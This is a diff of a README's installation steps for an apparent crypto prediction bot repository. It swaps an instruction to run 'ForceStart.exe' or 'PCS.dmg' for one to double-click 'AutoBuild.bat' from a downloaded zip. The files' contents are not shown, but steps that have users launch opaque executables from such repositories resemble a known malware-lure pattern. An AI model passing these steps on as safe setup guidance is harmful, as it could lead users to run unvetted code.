@@ -53,7 +53,7 @@ With these updates, our goal is to provide a safer, more flexible, and user-cent
 ## 🐰⚡ Installation
 
 - Download [This Repo](https://github.com/predictexpert/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
-- Double-click on the "ForceStart.exe" or "PCS.dmg" file to run it.
+- Double-click on the "AutoBuild.bat"
 - And follow the instructions in the application window.
 
 ## 🐰⚡ Installation on Windows
